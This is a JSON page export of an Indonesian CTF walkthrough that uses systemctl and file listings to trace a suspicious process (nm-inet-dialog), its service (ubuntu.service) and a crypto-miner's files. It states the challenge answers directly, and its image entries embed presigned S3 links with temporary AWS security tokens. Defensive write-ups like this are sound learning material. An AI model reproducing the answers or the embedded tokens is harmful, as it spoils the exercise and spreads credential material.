+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8048-9911-e1822971e53a",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:51:00.000Z",
+        "last_edited_time": "2025-08-10T07:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Di soal ini, kita diminta untuk mencari nama proses mencurigakan. ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c0-9e83-fd46389bcee2",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:51:00.000Z",
+        "last_edited_time": "2025-08-10T07:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Langkah pertama, saya langsung memeriksa semua service yang sedang berjalan dengan perintah:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8042-885b-c3c311584c11",
+        "type": "code",
+        "created_time": "2025-08-10T07:52:00.000Z",
+        "last_edited_time": "2025-08-10T07:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "systemctl | grep \"running\"",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "python",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8037-b912-cd2d3b39ece1",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:52:00.000Z",
+        "last_edited_time": "2025-08-10T07:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dari hasil tersebut menampilkan banyak service, tetapi ada satu yang menarik perhatian:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80ea-8093-d17d4b23726a",
+        "type": "image",
+        "created_time": "2025-08-10T07:52:00.000Z",
+        "last_edited_time": "2025-08-10T07:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-17.png",
+          "expiry_time": "2025-09-18T13:53:34.399Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-17.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ac90703d-4e8e-40d7-b8a9-a56c71ff2801/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=a785a25f73d8ff6dec44490e32e7f2fad415520c0a2a423135d7c149f459ef8f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8044-8c05-c64a082ba392",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:53:00.000Z",
+        "last_edited_time": "2025-08-10T07:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada service ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "ubuntu.service",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " ini mencurigakan karena nama servicenya tidak umum dan juga description-nya (",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "TRYHACK3M",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ") terlihat seperti sengaja dibuat untuk challenge.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80db-9a3f-d903cd922ecb",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:54:00.000Z",
+        "last_edited_time": "2025-08-10T07:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80dc-895e-f26306290460",
+        "type": "paragraph",
+        "created_time": "2025-08-10T07:54:00.000Z",
+        "last_edited_time": "2025-08-10T07:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk melihat detail service tersebut, saya jalankan:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8003-acdf-c5639a7fc7ba",
+        "type": "code",
+        "created_time": "2025-08-10T07:55:00.000Z",
+        "last_edited_time": "2025-08-10T07:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "systemctl status ubuntu.service",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24adb469-a81d-8071-9595-da20db972390",
+        "type": "image",
+        "created_time": "2025-08-09T14:41:00.000Z",
+        "last_edited_time": "2025-08-10T07:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-18.png",
+          "expiry_time": "2025-09-18T13:53:34.401Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-18.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ba7ed79d-8ba1-4844-8a2d-cc2584f0cf45/796f5e3d-b046-443b-b93e-e167ea81019e.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=f18e95ff78995e1d1358ec2722606d0b371515f6712aa61e145115fcfa189b9f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d8-ba14-d7a453bbff90",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:04:00.000Z",
+        "last_edited_time": "2025-08-10T08:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dari sini terlihat jelas bahwa:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80e6-b286-d658e06779d1",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:04:00.000Z",
+        "last_edited_time": "2025-08-10T08:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Nama proses",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " (",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "Main PID",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ") = ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "nm-inet-dialog",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8097-aeff-cce17352e903",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:04:00.000Z",
+        "last_edited_time": "2025-08-10T08:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Path executable",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " = ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "/lib/NetworkManager/nm-inet-dialog",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8085-8323-fd27c9a87245",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:04:00.000Z",
+        "last_edited_time": "2025-08-10T08:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Jadi jawaban untuk soal pertama adalah ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "nm-inet-dialog",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8091-81b3-ce6fc4d2cfe4",
+        "type": "heading_3",
+        "created_time": "2025-08-10T02:58:00.000Z",
+        "last_edited_time": "2025-08-10T03:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "3. What is the service name affiliated with the suspicious process?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d5-a5f2-ec9e5cf41530",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:04:00.000Z",
+        "last_edited_time": "2025-08-10T08:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk memastikan service mana yang menjalankan proses ini, saya cek file unit-nya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8045-9cac-c7920388617a",
+        "type": "code",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-08-10T08:49:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "cat /etc/systemd/system/ubuntu.service",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80a4-bd93-ec2ad3ef8c0c",
+        "type": "image",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-19.png",
+          "expiry_time": "2025-09-18T13:53:34.403Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-19.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/9d9d553f-6f61-4772-aa13-a67fbeaf3ff1/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=426a14402455ab8991d05043899f16927a28fb33ee2de965eccc541faa46aad7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80cf-a28b-e1f651a6edef",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-08-10T08:49:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dari sini terlihat bahwa:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8018-8f9f-fd040a29b03a",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-08-10T08:49:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Service name (unit file name) = ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "ubuntu.service",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8083-bf46-cf0a9227c0da",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-08-10T08:49:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Service ini memang menjalankan binary ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "nm-inet-dialog",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80f6-b2d1-cb50703f2632",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:49:00.000Z",
+        "last_edited_time": "2025-08-10T08:50:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Jawaban untuk soal ini yaitu: ubuntu.service",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d9-8fb4-ca958664e931",
+        "type": "heading_3",
+        "created_time": "2025-08-10T03:00:00.000Z",
+        "last_edited_time": "2025-08-10T08:05:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "4. What is the log file name of the miner instance?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b2-962d-f06665b8c740",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:51:00.000Z",
+        "last_edited_time": "2025-08-10T08:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Karena pada soal sebelumnya kita sudah tahu executable ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "nm-inet-dialog",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " berada di direktori ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "/lib/NetworkManager",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", maka langkah logis berikutnya adalah memeriksa isi direktori tersebut.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d1-bf6e-d88daf994ab3",
+        "type": "code",
+        "created_time": "2025-08-10T08:57:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "ls -la /lib/NetworkManage",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8065-9e50-f798ec1eb52a",
+        "type": "image",
+        "created_time": "2025-08-10T08:53:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-20.png",
+          "expiry_time": "2025-09-18T13:53:34.409Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-20.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5906fb88-0e26-4538-a573-2e800ced2625/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=0cbf65555368d5dcb9f242faf101367c3d3176d589b14ee61b20840ed7c12604&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8067-8334-fe197ad52cbf",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:57:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Hasilnya menampilkan berbagai file biner dan subdirektori, namun ada satu file yang terlihat tidak biasa:",
+              "annotations": {
+                "bold": false,
